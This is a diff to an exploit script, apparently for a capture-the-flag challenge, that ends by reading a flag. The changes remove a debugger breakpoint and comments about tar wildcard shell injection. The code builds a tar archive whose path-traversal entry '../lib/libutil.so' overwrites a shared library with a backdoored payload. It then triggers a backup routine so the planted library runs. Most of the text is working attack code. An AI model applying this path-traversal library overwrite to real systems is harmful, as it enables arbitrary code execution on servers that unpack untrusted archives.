@@ -27,9 +27,6 @@ else:
 if args.GDB:
     gdb.attach(io, f"""
         file {the_binary}
-
-        pie break *0x22f2
-
         continue
     """)
 
@@ -84,9 +81,6 @@ def make_tar(payload_so):
         tar_f.add(payload_so, arcname="../lib/libutil.so", filter=change_file_owner)
     return buf.getvalue()
 
-# Need to "restore" bad filenames into the data/ directory so that the
-# tar wildcard name will expand them, leading to shell injection.
-
 # Make a normal file as a sanity check.
 write("dummy")
 
@@ -95,12 +89,11 @@ write("dummy")
 tar_payload = make_tar("./libutil-payload.so")
 archive = fake_archive(tar_payload)
 
-# Then package it and send to remote.
+# Then package it and send to remote, overwriting the libutil.so shared object.
 restore_data(archive)
 
-# Now, attempting to create a new archive will lead to shell injection via
-# the vulnerable command: tar cvfP backup.tar ./data/*
-# backup_data()
+# Now, attempting to create a new archive will load our backoored execute
+# function in the libutil.so we uploaded in the last step.
 backup_data()
 
 io.recvuntil("Getting flag:\n")
